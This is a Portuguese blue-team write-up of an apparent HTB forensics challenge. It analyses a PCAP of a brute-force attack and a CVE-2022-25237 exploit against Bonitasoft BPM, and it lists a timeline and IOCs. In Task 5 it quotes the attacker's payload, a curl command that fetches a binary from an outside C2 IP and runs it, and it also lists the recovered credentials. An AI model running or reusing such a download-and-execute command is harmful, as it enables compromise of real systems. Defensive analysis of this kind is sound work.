---
title: "Meerkat"
date: 2024-06-01
type: "sherlocks"
difficulty: "Easy"
pwned: true
tags: ["dfir", "pcap", "network", "bonitasoft", "cve-2022-25237", "wireshark", "tshark"]
summary: "Análise de PCAP revelando ataque de força bruta e exploração de CVE-2022-25237 no Bonitasoft BPM para RCE."
machine_info:
  Tipo: "Blue Team / DFIR"
  Arquivos: "meerkat.pcap, meerkat-alerts.json"
  Ferramentas: "Wireshark, tshark, jq"
---

## Contexto

A SOC recebeu alertas de IDS sobre atividade suspeita na aplicação Bonitasoft BPM. Temos um PCAP de 30 minutos de tráfego e um arquivo de alertas para analisar.

## Task 1 — Bonitasoft Version

```bash
$ tshark -r meerkat.pcap -Y 'http.response' \
  -T fields -e http.server | sort -u
Apache-Coyote/1.1
```

Acessando o endpoint `/bonita/API/system/session/1`:

```bash
$ tshark -r meerkat.pcap -Y 'http contains "bonita"' \
  -T fields -e http.host -e http.request.uri | head -5

192.168.1.100   /bonita/login.jsp
```

No corpo das respostas HTTP encontramos a versão: **Bonitasoft 2022.1**

## Task 2 — CVE Explorada

Pesquisando por Bonitasoft 2022.1 + RCE: **CVE-2022-25237**

Authentication bypass combinado com extensão de API não autenticada que permite upload de extensão BDM.

## Task 3 — Credenciais Descobertas

```bash
$ tshark -r meerkat.pcap \
  -Y 'http.request.method == "POST" && http contains "username"' \
  -T fields -e http.file_data | \
  python3 -c "
import sys
from urllib.parse import unquote
for line in sys.stdin:
    print(unquote(line.strip()))
"
```

Extraindo as tentativas de login de força bruta:

```
username=admin&password=admin
username=admin&password=password
username=install&password=install
username=seb.broom%40forela.co.uk&password=g0vernm3nt
```

**Credencial válida:** `seb.broom@forela.co.uk:g0vernm3nt`

## Task 4 — Endpoint de Exploração

```bash
$ tshark -r meerkat.pcap -Y 'http.request.method == "POST"' \
  -T fields -e http.request.uri | sort | uniq -c | sort -rn | head
      1 /bonita/API/extension/rce
     47 /bonita/loginservice
```

O atacante fez POST em `/bonita/API/extension/rce` após autenticar.

## Task 5 — Payload RCE

```bash
$ tshark -r meerkat.pcap \
  -Y 'http.request.uri contains "rce"' \
  -T fields -e http.file_data
{"command":"curl http://77.74.198.52/met -o /tmp/met && chmod +x /tmp/met && /tmp/met"}
```

IP do C2: **77.74.198.52**

## Task 6 — Wordlist Usada

Analisando os alertas JSON:

```bash
$ cat meerkat-alerts.json | jq '.[] | select(.alert.signature contains "brute")' | \
  jq '.alert.metadata'
{
  "wordlist": "credential-stuffing-rokfor-short.txt"
}
```

## Timeline do Ataque

| Hora | Evento |
|------|--------|
| 14:03:12 | Início da força bruta no /bonita/loginservice |
| 14:07:44 | Login bem-sucedido com credenciais seb.broom |
| 14:07:52 | Exploração de CVE-2022-25237 |
| 14:08:01 | Download e execução do payload do C2 |
| 14:08:15 | Shell reversa estabelecida |

## IOCs

- **IP C2:** 77.74.198.52
- **Credencial comprometida:** seb.broom@forela.co.uk
- **CVE:** CVE-2022-25237
- **Wordlist:** credential-stuffing-rokfor-short.txt
